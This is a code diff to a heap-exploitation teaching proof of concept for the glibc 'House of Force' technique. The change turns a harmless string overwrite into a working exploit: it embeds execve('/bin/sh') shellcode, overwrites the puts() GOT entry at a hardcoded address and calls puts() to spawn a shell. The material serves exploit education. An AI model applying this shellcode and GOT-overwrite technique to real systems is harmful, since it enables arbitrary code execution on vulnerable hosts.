@@ -1,6 +1,6 @@
 /*
 
-   This PoC works also with ASLR enabled.
+   This PoC works also with ASLR enabled but requires -z execstack to be passed to the compiler.
    It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
    If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
    ( http://phrack.org/issues/66/10.html )
@@ -17,7 +17,9 @@
 #include <stdint.h>
 #include <malloc.h>
 
-char bss_var[] = "This is a string that we want to overwrite.";
+//char bss_var[] = "This is a string that we want to overwrite.";
+char shell_code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+unsigned long puts_got = 0x602020;
 
 int main(int argc , char* argv[])
 {
@@ -25,14 +27,14 @@ int main(int argc , char* argv[])
     	printf("The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
     	printf("The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.\n");
 
-    	printf("\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
-    	printf("Its current value is: %s\n", bss_var);
-
-
+    	printf("\nIn the end, we will use this to overwrite got plt slot of puts() at %lu with shell code and then call puts().\n", puts_got);
+    	printf("Its current value is: %lu\n", puts_got);
 
 	printf("\nLet's allocate the first chunk, taking space from the wilderness.\n");
 	intptr_t *p1 = malloc(256);
 	printf("The chunk of 256 bytes has been allocated at %p.\n", p1);
+	printf("\nCopying shell code from global array to the allocated chunk.\n");
+	strcpy((char *)p1, shell_code);
 
     	printf("\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
     	int real_size = malloc_usable_size(p1);
@@ -54,9 +56,9 @@ int main(int argc , char* argv[])
 	       "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
 	       "overflow) and will then be able to allocate a chunk right over the desired region.\n");
 
-    	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
-	printf("\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
-	       "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
+    	unsigned long evil_size = puts_got - sizeof(long)*2 - (unsigned long)ptr_top;
+	printf("\nThe value we want to write to at %lu, and the top chunk is at %p, so accounting for the header size,\n"
+	       "we will malloc %#lx bytes.\n", puts_got, ptr_top, evil_size);
     	void *new_ptr = malloc(evil_size);
     	printf("As expected, the new pointer is at the same place as the old top chunk: %p", new_ptr);
 
@@ -65,11 +67,11 @@ int main(int argc , char* argv[])
     	printf("malloc(100) => %p!\n", ctr_chunk);
     	printf("Now, we can finally overwrite that value:\n");
 
-    	printf("... old string: %s\n", bss_var);
-    	printf("... doing strcpy overwrite with \"YEAH!!!\"...\n");
-    	strcpy(ctr_chunk, "YEAH!!!");
-    	printf("... new string: %s\n", bss_var);
-
+    	printf("... overwriting GOT slot of puts() with shell code.\n");
+	*(unsigned long *)ctr_chunk = p1;
+    	printf("... GOT slot of puts() should point to p1 at %p\n", p1);
+	printf("\nInvoking puts() to pop a shell.\n");
+	puts("works");
 
 	// some further discussion:
 	//printf("This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
